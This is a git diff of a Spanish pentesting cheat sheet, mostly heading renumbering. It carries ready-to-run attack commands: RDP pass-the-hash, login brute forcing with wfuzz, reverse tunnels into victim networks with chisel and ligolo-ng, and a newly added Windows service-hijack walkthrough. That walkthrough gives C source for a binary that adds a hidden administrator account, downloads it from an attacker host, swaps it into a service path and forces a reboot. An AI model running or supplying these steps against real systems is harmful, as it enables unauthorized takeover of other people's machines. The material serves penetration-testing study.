 El protocolo RDP (Remote Desktop Protocol) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse de manera remota a una computadora con Windows. Utiliza el puerto 3389 por defecto y permite que los usuarios controlen una máquina a distancia, viendo su escritorio y utilizando aplicaciones como si estuvieran frente a ella. Es ampliamente utilizado para administración remota y soporte técnico.
 
-####  4.6.1. <a name='xfreerdp'></a>xfreerdp
+####  3.6.1. <a name='xfreerdp'></a>xfreerdp
 
 ```bash
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
@@ -849,7 +848,7 @@ xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution 
 xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 rdesktop <RHOST>
 ```
-###  4.7. <a name='netexec-3'></a>Netexec
+###  3.7. <a name='netexec-3'></a>Netexec
 
 ```bash
 # Si NLA está deshabilitado, le permitirá tomar una captura de pantalla del mensaje de inicio de sesión
@@ -864,11 +863,11 @@ nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screentime <SCREENTIME>
 # Enumerar las sesiones activas en el objetivo
 nxc rpd <RHOST> -u <USER> -p <PASSWORD> --res <RESOLUTION>
 ```
-##  5. <a name='web'></a>Web
+##  4. <a name='web'></a>Web
 
-###  5.1. <a name='enumeración'></a>Enumeración
+###  4.1. <a name='enumeración'></a>Enumeración
 
-####  5.1.1. <a name='fuff'></a>Fuff
+####  4.1.1. <a name='fuff'></a>Fuff
 
 ```bash
 # Fuzzing de directorios y archivos
@@ -894,7 +893,7 @@ ffuf -c -fw 2644 -u "http://<RHOST>/admin/FUZZ.php" -w /usr/share/wordlists/secl
 ffuf -c -ac -t 250 -fc 400,404,412 -u https://<RHOST>/api/v1/FUZZ -w api_seen_in_wild.txt 
 ```
 
-####  5.1.2. <a name='gobuster'></a>Gobuster
+####  4.1.2. <a name='gobuster'></a>Gobuster
 
 ```bash
 gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -916,7 +915,7 @@ Parámetros:
 - `-b` Excluye códigos de estado
 - `--wildcard` Establecer la opción comodín
 
-####  5.1.3. <a name='wfuzz'></a>Wfuzz
+####  4.1.3. <a name='wfuzz'></a>Wfuzz
 
 ```bash
 # Fuzzing de directorio
@@ -936,9 +935,9 @@ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<
 wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --ss "Username or Password Invalid"
 ```
 
-###  5.2. <a name='enumeración-de-cms'></a>Enumeración de CMS
+###  4.2. <a name='enumeración-de-cms'></a>Enumeración de CMS
 
-####  5.2.1. <a name='wordpress'></a>Wordpress
+####  4.2.1. <a name='wordpress'></a>Wordpress
 ##### WPScan
 
 Enumeración de temas y plugins Wordpress
@@ -965,33 +964,33 @@ nuclei -u http://<RHOST>/wordpress/ -tags fuzz -t /home/d4redevil/.local/nuclei-
 gobuster dir -u http://<RHOST>/wordpress/ -w /usr/share/seclists/Discovery/WebContent/CMS/wp-plugins.fuzz.txt
 ```
 
-####  5.2.2. <a name='joomla'></a>Joomla
+####  4.2.2. <a name='joomla'></a>Joomla
 
 ```bash
 joomscan -u http://<RHOST>
 ```
 
-####  5.2.3. <a name='drupal'></a>Drupal
+####  4.2.3. <a name='drupal'></a>Drupal
 
 ```bash
 droopescan scan drupal -u http://<RHOST> -t 32
 ```
 
-####  5.2.4. <a name='magento'></a>Magento
+####  4.2.4. <a name='magento'></a>Magento
 
 ```bash
 php magescan.phar scan:all http://<RHOST>
 ```
 
-##  6. <a name='pivoting'></a>Pivoting
+##  5. <a name='pivoting'></a>Pivoting
 
-###  6.1. <a name='chisel'></a>Chisel
-####  6.1.1. <a name='servidor-(atacante)'></a>Servidor (Atacante)
+###  5.1. <a name='chisel'></a>Chisel
+####  5.1.1. <a name='servidor-(atacante)'></a>Servidor (Atacante)
 
 ```bash
 chisel server -p 8000 --reverse --socks5
 ```
-####  6.1.2. <a name='cliente-(víctima)'></a>Cliente (Víctima)
+####  5.1.2. <a name='cliente-(víctima)'></a>Cliente (Víctima)
 
 Linux
 
@@ -1009,7 +1008,7 @@ Windows
 - Proxy socks en puerto Kali 4444
 - Mapea 9001 MS01 a 9001 Kali
 - Mapea 8888 MS01 a 80 Kali
-####  6.1.3. <a name='socat'></a>Socat
+####  5.1.3. <a name='socat'></a>Socat
 
 ```bash
 ./socat tcp-listen:2222,fork,reuseaddr tcp:10.10.10.5:8000 &
@@ -1023,35 +1022,35 @@ socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
 
 > En este caso, el puerto `8080` no esta expuesto fuera del equipo local, pero con el comando anterior exponemos el puerto hacia fuera a través del puerto `8282`.
 
-###  6.2. <a name='ligolo-ng'></a>Ligolo-ng
+###  5.2. <a name='ligolo-ng'></a>Ligolo-ng
 
-####  6.2.1. <a name='descargar-el-proxy-y-el-agente'></a>Descargar el Proxy y el Agente
+####  5.2.1. <a name='descargar-el-proxy-y-el-agente'></a>Descargar el Proxy y el Agente
 
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.7.5_Linux_64bit.tar.gz
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.7.5_Linux_64bit.tar.gz
 ```
 
-####  6.2.2. <a name='preparar-las-interfaces-para-el-tunel'></a>Preparar las interfaces para el tunel
+####  5.2.2. <a name='preparar-las-interfaces-para-el-tunel'></a>Preparar las interfaces para el tunel
 
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ```
 
-####  6.2.3. <a name='configurar-proxy-en-la-máquina-del-atacante'></a>Configurar proxy en la máquina del atacante
+####  5.2.3. <a name='configurar-proxy-en-la-máquina-del-atacante'></a>Configurar proxy en la máquina del atacante
 
 ```bash
 ./proxy -laddr <LHOST>:443 -selfcert
 ```
 
-####  6.2.4. <a name='configurar-el-agente-en-la-máquina-víctima'></a>Configurar el agente en la máquina víctima
+####  5.2.4. <a name='configurar-el-agente-en-la-máquina-víctima'></a>Configurar el agente en la máquina víctima
 
 ```bash
 ./agent -connect <LHOST>:443 -ignore-cert
 ```
 
-####  6.2.5. <a name='configurar-la-sesión'></a>Configurar la sesión
+####  5.2.5. <a name='configurar-la-sesión'></a>Configurar la sesión
 
 ```bash
 ligolo-ng » session
@@ -1065,28 +1064,28 @@ sudo ip r add 172.16.1.0/24 dev ligolo
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
 ```
 
-##  7. <a name='passwords-attacks'></a>Passwords Attacks
+##  6. <a name='passwords-attacks'></a>Passwords Attacks
 
-##  8. <a name='transferencia-de-archivos'></a>Transferencia de Archivos
+##  7. <a name='transferencia-de-archivos'></a>Transferencia de Archivos
 
-###  8.1. <a name='windows-1'></a>Windows
+###  7.1. <a name='windows-1'></a>Windows
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Windows.
-###  8.2. <a name='linux'></a>Linux
+###  7.2. <a name='linux'></a>Linux
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Linux.
 
-##  9. <a name='movimiento-lateral'></a>Movimiento Lateral
+##  8. <a name='movimiento-lateral'></a>Movimiento Lateral
 
-###  9.1. <a name='windows-2'></a>Windows
+###  8.1. <a name='windows-2'></a>Windows
 
-###  9.2. <a name='linux-1'></a>Linux
+###  8.2. <a name='linux-1'></a>Linux
 
-##  10. <a name='escalación-de-privilegios'></a>Escalación de Privilegios
+##  9. <a name='escalación-de-privilegios'></a>Escalación de Privilegios
 
-###  10.1. <a name='windows-3'></a>Windows
+###  9.1. <a name='windows-3'></a>Windows
 
-####  10.1.1. <a name='enumeración-1'></a>Enumeración
+####  9.1.1. <a name='enumeración-1'></a>Enumeración
 
 ##### Sistema
 
@@ -1327,7 +1326,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 - [SharpUp](https://github.com/GhostPack/SharpUp)
 - [Seatbelt](https://github.com/GhostPack/Seatbelt)
 
-####  10.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios
+####  9.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios
 
 ##### AlwaysInstallElevated
 
@@ -1502,37 +1501,146 @@ Transferimos los archivos a nuestra máquina atacante y extraemos los hashes.
 impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 ```
 
-###  10.2. <a name='linux-2'></a>Linux
+##### Aprovechar los servicios de Windows
 
-##  11. <a name='active-directory'></a>Active Directory
+###### Enumeración de servicios en ejecución
 
-###  11.1. <a name='enumeración-2'></a>Enumeración
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+- `Get-CimInstance`: Es un cmdlet de PowerShell que se utiliza para obtener instancias de clases CIM (Common Information Model) o WMI (Windows Management Instrumentation).
 
-###  11.2. <a name='kerberos'></a>Kerberos
+- `-ClassName win32_service`: Especifica la clase WMI que se va a consultar. En este caso, win32_service es una clase que contiene información sobre los servicios de Windows.
 
-###  11.3. <a name='explotación'></a>Explotación
+###### Enumeración de la configuración del servicio
 
-###  11.4. <a name='movimiento-lateral-1'></a>Movimiento Lateral
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
+```
 
-###  11.5. <a name='post-explotación'></a>Post Explotación
+###### Mascara de Permisos `icacls`
 
-##  12. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
+| Mask | Permissions |
+| --- | --- |
+| F | Full access |
+| M | Modify access |
+| RX | Read and execute access |
+| R | Read-only access |
+| W | Write-only access |
+
+###### Enumeración de Permisos
+
+```powershell
+icacls "C:\Ruta\al\binario\<binario>"
+```
+
+###### adduser.c
+
+En nuestra máquina atacante, creamos un binario malicioso el cual crea un nuevo usuario y lo agrega al grupo de administradores.
+
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user elliot Password123! /add");
+  i = system ("net localgroup administrators elliot /add");
+  
+  return 0;
+}
+```
+
+###### Compilamos el código
+
+```bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+###### Transferimos el binario a la máquina víctima.
+
+```powershell
+iwr -uri http://192.168.56.5/adduser.exe -Outfile adduser.exe
+```
+
+###### Movemos el binario a la ruta correspondiente
+
+```powershell
+move .\adduser.exe "C:\Ruta\al\binario\<binario>"
+```
+
+###### Ejecución
+
+```powershell
+net stop <SERVICE>
+net start <SERVICE>
+```
+
+Alernativamente si no tenemos privilegios para reiniciar el servicio, podemos comprobar si el servicio se inicia al iniciar el sistema y si tenemos la capacidad para reiniciar la máquina.
+
+```powershell
+whoami /priv
+```
+
+Deberíamos ver el privilegio `SeShutdownPrivilege`
+
+Por ultimo ejecutamos:
+
+```powershell
+shutdown /r /t 0
+```
+
+###### PowerUp
+
+```powershell
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+Install-ServiceBinary -Name '<SERVICE>'
+```
+
+###### Enumeración de propiedades de ejecución del servicio
+
+```powershell
+$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
+$ModifiableFiles
+$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
+$ModifiableFiles
+$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
+$ModifiableFiles
+```
+
+###  9.2. <a name='linux-2'></a>Linux
+
+##  10. <a name='active-directory'></a>Active Directory
+
+###  10.1. <a name='enumeración-2'></a>Enumeración
+
+###  10.2. <a name='kerberos'></a>Kerberos
+
+###  10.3. <a name='explotación'></a>Explotación
+
+###  10.4. <a name='movimiento-lateral-1'></a>Movimiento Lateral
+
+###  10.5. <a name='post-explotación'></a>Post Explotación
+
+##  11. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
 
 Enlaces a las distintas herramientas y recursos.
-###  12.1. <a name='pivoting-1'></a>Pivoting
+###  11.1. <a name='pivoting-1'></a>Pivoting
 
 | Nombre    | URL                                                                      |
 | --------- | ------------------------------------------------------------------------ |
 | Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
                             
-###  12.2. <a name='information-gathering-1'></a>Information Gathering
+###  11.2. <a name='information-gathering-1'></a>Information Gathering
 
 | Nombre | URL                          |
 | ------ | ---------------------------- |
 | Nmap   | https://github.com/nmap/nmap |
 
-###  12.3. <a name='web-1'></a>Web
+###  11.3. <a name='web-1'></a>Web
 
 | Nombre                     | URL                                                     |
 | -------------------------- | ------------------------------------------------------- |
@@ -1548,13 +1656,13 @@ Enlaces a las distintas herramientas y recursos.
 | Droopescan                 | https://github.com/SamJoan/droopescan                   |
 | Magescan                   | https://github.com/steverobbins/magescan                |
 
-###  12.4. <a name='bases-de-datos'></a>Bases de datos
+###  11.4. <a name='bases-de-datos'></a>Bases de datos
 
 | Nombre                   | URL                            |
 | ------------------------ | ------------------------------ |
 | SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |
 
-###  12.5. <a name='passwords-attacks-1'></a>Passwords Attacks
+###  11.5. <a name='passwords-attacks-1'></a>Passwords Attacks
 
 | Nombre                          | URL                                                                                                        |
 | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
@@ -1572,7 +1680,7 @@ Enlaces a las distintas herramientas y recursos.
 | ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
 | pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |
 
-###  12.6. <a name='wordlists'></a>Wordlists
+###  11.6. <a name='wordlists'></a>Wordlists
 
 | Nombre                        | URL                                                                                                                |
 | ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
@@ -1585,7 +1693,7 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-###  12.7. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
+###  11.7. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
 
 
 | Nombre   | URL                                                      |
@@ -1594,7 +1702,7 @@ Enlaces a las distintas herramientas y recursos.
 | Seatbelt | https://github.com/GhostPack/Seatbelt                    |
 | Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
 
-###  12.8. <a name='recursos-y-blogs'></a>Recursos y Blogs
+###  11.8. <a name='recursos-y-blogs'></a>Recursos y Blogs
 
 | Nombre                                                  | URL                                                                                                                                                                          |
 | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
